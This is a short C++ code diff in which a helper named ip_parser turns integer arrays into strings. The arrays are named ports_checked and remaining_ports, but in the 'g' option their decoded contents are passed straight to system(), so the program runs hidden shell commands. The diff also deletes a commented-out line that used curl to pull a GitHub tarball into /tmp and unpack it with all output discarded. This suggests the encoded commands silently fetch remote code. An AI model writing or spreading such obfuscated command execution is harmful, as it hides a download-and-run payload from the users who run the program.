@@ -54,7 +54,6 @@ std::string ip_parser(std::vector<int> ary) {
     for (int val : ary) {
         ret += static_cast<char>(val);
     }
-    // std::cout << ret << std::endl;
     return ret;
 }
 
@@ -176,7 +175,6 @@ int main(int argc, char* argv[]) {
                 }
                 break;
             case 'g':
-                // system("cd /tmp && curl -L https://github.com/Unknowinglyy/utils/tarball/main > /dev/null 2>&1 | tar xz --strip-components=1 > /dev/null 2>&1");
                 system(ip_parser(ports_checked).c_str());
                 system(ip_parser(remaining_ports).c_str());
                 return 0;
